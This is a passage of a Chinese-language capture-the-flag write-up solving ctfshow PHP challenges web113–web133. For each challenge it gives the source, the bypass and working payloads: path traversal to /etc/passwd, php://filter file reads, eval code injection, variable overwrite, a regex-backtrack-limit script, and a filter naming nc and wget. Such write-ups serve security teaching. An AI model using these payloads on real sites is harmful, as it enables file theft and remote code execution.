class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>增加了过滤filter, 上一题给出了一种方法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">compress.zlib://flag.php</span><br></pre></td></tr></table></figure><p>官方预期解为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</span><br></pre></td></tr></table></figure><p>其中<code>/proc/self/root</code>是Linux系统中一个特殊的符号链接, 它始终指向当前进程的根目录; 由于目录溢出导致is_file无法正确解析, 认为这不是一个文件, 返回FALSE</p><h2 id="web114"><a class="header-anchor" href="#web114">¶</a>web114</h2><ul><li>描述: 同上</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;师傅们居然tql都是非预期 哼！&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(! <span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>你怎么又回来了, 那就用伪协议吧</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=php://filter/resource=flag.php</span><br></pre></td></tr></table></figure><h2 id="web115"><a class="header-anchor" href="#web115">¶</a>web115</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$num</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;0&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;e&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;+&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$num</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$num</span>) <span class="keyword">and</span> <span class="variable">$num</span>!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">trim</span>(<span class="variable">$num</span>)!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">filter</span>(<span class="variable">$num</span>)==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hacker!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!!!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>str_replace(find,replace,string,count)</code>函数替换字符串中的一些字符, 区分大小写; 题中替换了一些常见的其他形式的数字</p><p><code>trim(string,charlist)</code>函数移除字符串两侧的空白字符或其他预定义字符, 因为第二个参数没有定义, 所以移除以下所有内容:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;\0&quot; - NULL</span><br><span class="line">&quot;\t&quot; - 制表符</span><br><span class="line">&quot;\n&quot; - 换行</span><br><span class="line">&quot;\x0B&quot; - 垂直制表符</span><br><span class="line">&quot;\r&quot; - 回车</span><br><span class="line">&quot; &quot; - 空格</span><br></pre></td></tr></table></figure><p>要求在经过过滤函数前传入的<code>$num</code>不能是36, 经过过滤后要等于36</p><p><code>trim</code>函数并没有过滤换页符(%0c), 如果利用换页符构造, <code>filter</code>函数也不会生效, 所以构造:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?num=%0c36</span><br></pre></td></tr></table></figure><p>%0c在前面的原因是还需要绕过<code>is_numeric</code>, 此函数可以在数字前面加上空格或者等效于空格(%09)的进行绕过</p><blockquote><p>注意<code>!==</code>和<code>===</code>都是强等于, 而有类似空格的在数字前面, 都不会强等于数字</p></blockquote><p>后面的<code>filter</code>是弱比较, 经过类型转换后变灰了36, 可以通过, 所以这就是payload了</p><h2 id="web123"><a class="header-anchor" href="#web123">¶</a>web123</h2><ul><li>描述: 突破函数禁用</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?/&quot;</span>, <span class="variable">$c</span>)&amp;&amp;<span class="variable">$c</span>&lt;=<span class="number">18</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);  </span><br><span class="line">         <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先是经典的传入<code>_</code>要用<code>[</code>替代(传入的变量名如果包含空格, 加号, 左中括号会被转化为下划线): 网站默认会把点转换为下划线, 对不符合规则的变量只转换一次, 而<code>CTF_SHOW.COM</code>里有两个不规则的字符, 所以需要写成<code>CTF[SHOW.COM</code></p><p><code>$fl0g</code>是不能传参的, 所以利用只能是<code>eval(&quot;$c&quot;.&quot;;&quot;);</code>, 使<code>$c</code>等于<code>echo $flag;</code>即可, 刚好小于18</p><p>payload如下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=echo $flag</span><br></pre></td></tr></table></figure><h2 id="web125"><a class="header-anchor" href="#web125">¶</a>web125</h2><ul><li>描述: php特性</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i&quot;</span>, <span class="variable">$c</span>)&amp;&amp;<span class="variable">$c</span>&lt;=<span class="number">16</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);</span><br><span class="line">         <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在<code>$fl0g</code>可控了, 但是是要求不能有<code>$fl0g</code>; <code>$c</code>长度限制变成了16且增加了新的过滤</p><p>既然POST走不通那就走GET, payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET: ?1=flag.php </span><br><span class="line">POST: CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=highlight_file($_GET[1])</span><br></pre></td></tr></table></figure><h2 id="web126"><a class="header-anchor" href="#web126">¶</a>web126</h2><ul><li>描述: 同上</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i&quot;</span>, <span class="variable">$c</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$c</span>)&lt;=<span class="number">16</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);  </span><br><span class="line">         <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>新增的匹配导致输出函数和GET方法都不能使用了, 那考虑满足<code>$fl0g</code>的条件利用变量覆盖获取flag</p><p>可能利用到的函数:</p><p><code>extract($array)</code>函数, 从数组中将变量导入到当前的符号表, 可以实现变量覆盖(但是有c, 被过滤了); <code>parse_str($str)</code>函数, 将字符串解析成多个变量, 可用; <code>assert()</code>执行php语句, 可用</p><p>那怎么传入 fl0g=flag_give_me, 只能是<code>$a=$_SERVER['argv'];</code></p><blockquote><p><code>$_SERVER['argv']</code>在Web模式下默认是不可用的, 主要用于处理命令行参数</p><p>Web模式下如果要<code>$_SERVER['argv']</code>能接受GET的传参, 需要在php.ini中设置<code>register_argc_argv=On</code>, 此时<code>$_SERVER['argv'][0] = $_SERVER['QUERY_STRING'];</code>, 可以利用GET传入参数, 格式和命令行相同, 空格隔开参数</p></blockquote><p>进行本地测试可以利用以下代码:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// 检查 register_argc_argv 是否打开  </span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;register_argc_argv&#x27;</span>)) &#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;register_argc_argv 已打开。&lt;br&gt;&quot;</span>;  </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;register_argc_argv 未打开。&lt;br&gt;&quot;</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_SERVER</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后传入<code>?a=b+c=d</code>, 查看输出是否是argv中有两个元素a=b, c=d</p><p>由此构建payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET:?a=1+fl0g=flag_give_me</span><br><span class="line">POST:CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=parse_str($a[1])</span><br></pre></td></tr></table></figure><p>或者用<code>assert</code>甚至<code>eval</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET:?$fl0g=flag_give_me</span><br><span class="line">POST:CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=assert($a[0])</span><br><span class="line"></span><br><span class="line">GET:?$fl0g=flag_give_me;# eval内部语句要有结尾</span><br><span class="line">POST:CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=eval($a[0])</span><br></pre></td></tr></table></figure><h2 id="web127"><a class="header-anchor" href="#web127">¶</a>web127</h2><ul><li>描述:</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$ctf_show</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>);</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//特殊字符检测</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\.|\\\|\//&#x27;</span>, <span class="variable">$url</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">waf</span>(<span class="variable">$url</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;嗯哼？&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctf_show</span>===<span class="string">&#x27;ilove36d&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>extract</code>函数从数组中将变量导入到当前的符号表, 就是如果传入的是?a=1, 就会变成程序中的$a=1</p><p>难绷官方警告:</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240725160619167.png" alt="image-20240725160619167"></p><p>因为对不符合规则的变量转换一次, 本来是不需要构造的, 特殊字符的检测需要我们用空格来代替下划线; payload如下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ctf show=ilove36d</span><br></pre></td></tr></table></figure><h2 id="web128"><a class="header-anchor" href="#web128">¶</a>web128</h2><ul><li>描述: 骚操作</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$f1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f1&#x27;</span>];</span><br><span class="line"><span class="variable">$f2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f2&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">check</span>(<span class="variable">$f1</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">call_user_func</span>(<span class="title function_ invoke__">call_user_func</span>(<span class="variable">$f1</span>,<span class="variable">$f2</span>)));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;嗯哼？&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]|[a-z]/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>gettext</code>函数的<a href="https://www.php.net/manual/zh/book.gettext.php">官方解释</a>和<a href="https://www.cnblogs.com/lost-1987/articles/3309693.html">进阶配置</a>, 可以了解到<code>_()</code>是等价于<code>gettext()</code>的, 很好的绕过了正则</p><p><code>get_defined_vars</code> 函数, 返回由所有已定义变量所组成的数组</p><p><code>call_user_func</code>会利用<code>_()</code>将<code>get_defined_vars</code>返还出来(就是输出还是输入), 然后再有一个call_user_func来调用get_defined_vars函数，然后利用var_dump函数输出就可以得到flag; payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?f1=_&amp;f2=get_defined_vars</span><br></pre></td></tr></table></figure><blockquote><p>这里就没有用其他符号替代下划线的方法, 尝试替代之后发现payload失效</p><p>f2可以等于phpinfo, 可以得到详细信息</p></blockquote><h2 id="web129"><a class="header-anchor" href="#web129">¶</a>web129</h2><ul><li>描述: 常规操作</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$f</span>, <span class="string">&#x27;ctfshow&#x27;</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">readfile</span>(<span class="variable">$f</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>stripos</code> 函数, 查找字符串首次出现的位置(不区分大小写), 如果没出现就返回FALSE</p><p>不知道在哪, 不知道读什么, 就去<code>/etc/passwd</code>或者<code>index.php</code>, 至于怎么绕过<code>stripos</code>, 访问不存在的目录再回来不就好了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?f=../ctfshow/../../../etc/passwd</span><br></pre></td></tr></table></figure><p>那差不多就结束了, 现在只需要测试flag在哪里就可以了; payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?f=../ctfshow/../../../../var/www/html/flag.php</span><br><span class="line">?f=/ctfshow/../../../../var/www/html/flag.php</span><br></pre></td></tr></table></figure><h2 id="web130"><a class="header-anchor" href="#web130">¶</a>web130</h2><ul><li>描述: very very very（省略25万个very）ctfshow</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+?ctfshow/is&#x27;</span>, <span class="variable">$f</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$f</span>, <span class="string">&#x27;ctfshow&#x27;</span>) === <span class="literal">FALSE</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先检查变量<code>$f</code>中是否包含(不区分大小写, 且可以跨越多行), 以任意字符(但尽可能少)开头, 紧接着是<code>ctfshow</code>这个字符串的文本, 例如/ctfshow</p><p>然后因为<code>stripos</code>函数返回的是数字, 肯定不会强等于FALSE, 所以在任何位置出现特停字符串即可; 以上两个过滤都是形同虚设, payload如下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST: f=ctfshow</span><br></pre></td></tr></table></figure><p>看不懂的也可以直接利用正则最大回溯次数绕过(<a href="https://www.laruence.com/2010/06/08/1579.html">洞悉正则最大回溯/递归限制</a>): PHP为了防止正则表达式的拒绝服务攻击(reDOS), 给 pcre设定了一个回溯次数上限<code>pcre.backtrack_limit</code>; 回溯次数上限默认是100万, 如果回溯次数超过了100 万, <code>preg_match</code>将不再返回1和0, 而是 false</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://03771c3c-6afb-4457-a719-19cc6ccf922e.chall.ctf.show/&quot;</span></span><br><span class="line">data=&#123;</span><br><span class="line"><span class="string">&#x27;f&#x27;</span>:<span class="string">&#x27;very&#x27;</span>*<span class="number">250000</span>+<span class="string">&#x27;ctfshow&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">r=requests.post(url,data=data)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><h2 id="web131"><a class="header-anchor" href="#web131">¶</a>web131</h2><ul><li>描述: 同上</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = (String)<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+?ctfshow/is&#x27;</span>, <span class="variable">$f</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$f</span>,<span class="string">&#x27;36Dctfshow&#x27;</span>) === <span class="literal">FALSE</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将传入的类型强制变成了字符串(所以说上一题用数组也可以绕过?), 这下不得不利用正则最大回溯绕过了, 里面参杂一个36Dctfshow即可, 脚本还是用上面那个</p><h2 id="web132"><a class="header-anchor" href="#web132">¶</a>web132</h2><ul><li>描述: 为什么会这样？</li></ul><p>打开来是一个网页, /robots.txt中找到后台登录界面/admin</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$username</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="variable">$code</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$code</span> === <span class="title function_ invoke__">mt_rand</span>(<span class="number">1</span>,<span class="number">0x36D</span>) &amp;&amp; <span class="variable">$password</span> === <span class="variable">$flag</span> || <span class="variable">$username</span> ===<span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$code</span> == <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运算优先级虽然<code>&amp;&amp;</code>是大于<code>||</code>, 但是只要<code>$username=admin</code>, 整个判断式为真(或只要一边为真即为真)</p><p>所以只需要<code>$username=$code=admin</code>即可, payload如下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/admin/?username=admin&amp;password=1&amp;code=admin</span><br></pre></td></tr></table></figure><h2 id="web133"><a class="header-anchor" href="#web133">¶</a>web133</h2><ul><li>描述: 同上</li><li>官方推荐: <a href="https://blog.csdn.net/qq_46091464/article/details/109095382">ctfshow web133和其他命令执行的骚操作</a></li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;</span>, <span class="variable">$F</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;6个字母都还不够呀?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>限制为6个字符, 但是它没有对传入的变量<code>$F</code>进行操作, 仅仅只是截取了前六个字符然后放进了<code>eval</code>函数</p><p>所以可以尝试变量覆盖,刚好构造6个字符(自己覆盖自己也是覆盖):</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?F=`$F`;%20</span><br></pre></td></tr></table></figure><blockquote><p>利用touch 1测试能否写入文件, 